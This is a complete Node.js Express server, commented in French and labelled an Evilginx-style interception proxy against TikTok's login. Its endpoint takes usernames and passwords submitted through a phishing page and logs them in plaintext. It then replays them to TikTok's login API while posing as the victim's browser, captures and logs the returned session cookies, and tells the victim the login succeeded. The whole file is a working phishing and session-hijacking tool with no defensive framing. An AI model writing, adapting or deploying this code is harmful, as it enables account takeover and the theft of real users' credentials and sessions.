const express = require('express');
const path = require('path');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post('/api/auth', async (req, res) => {
    const { identifiant, password, userAgent } = req.body;

    console.log("\n--- INTERCEPTION PROXY (Style Evilginx) ---");
    console.log("CIBLE : https://www.tiktok.com/auth/login/");
    console.log("USER  : " + identifiant);
    console.log("PASS  : " + password);

    try {
        // Le serveur Render imite la victime et contacte TikTok
        const response = await axios.post('https://www.tiktok.com/api/v1/auth/login/', {
            username: identifiant,
            password: password
        }, {
            headers: {
                'User-Agent': userAgent,
                'Content-Type': 'application/json',
                'Referer': 'https://www.tiktok.com/'
            },
            validateStatus: () => true // On veut voir la réponse même si c'est 401
        });

        // RÉCUPÉRATION DES COOKIES DE SESSION (Set-Cookie)
        const interceptedCookies = response.headers['set-cookie'];
        
        if (interceptedCookies) {
            console.log("✅ COOKIES DE SESSION INTERCEPTÉS :");
            interceptedCookies.forEach(cookie => {
                console.log("   -> " + cookie.split(';')[0]); // On nettoie pour ne garder que la valeur
            });
        } else {
            console.log("❌ Aucun cookie de session reçu (Vérifiez les identifiants)");
        }

    } catch (error) {
        console.log("⚠️ Erreur lors du relais Proxy :", error.message);
    }

    console.log("-------------------------------------------\n");
    res.status(200).json({ status: "success" });
});

app.listen(PORT, () => {
    console.log(`Serveur Proxy actif sur le port ${PORT}`);
});
